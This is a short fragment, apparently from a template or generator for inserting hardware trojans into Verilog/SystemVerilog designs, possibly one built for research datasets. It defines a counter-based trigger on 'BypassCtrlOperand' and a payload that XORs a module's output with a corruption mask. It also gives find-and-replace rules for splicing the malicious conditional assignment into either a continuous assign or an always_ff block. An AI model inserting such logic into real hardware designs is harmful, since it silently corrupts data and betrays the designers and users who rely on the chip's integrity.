 ...
 *   
 * Trigger: Counter on BypassCtrlOperand
 * Payload: Corrupt out with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt out with XOR
//
// Integration Script Must Modify:
//
// IF out is assigned:
//   Find: assign out = data_value;
//   Replace: assign out = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF out is in always_ff:
//   Find: out <= data_value;
//   Replace: out <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
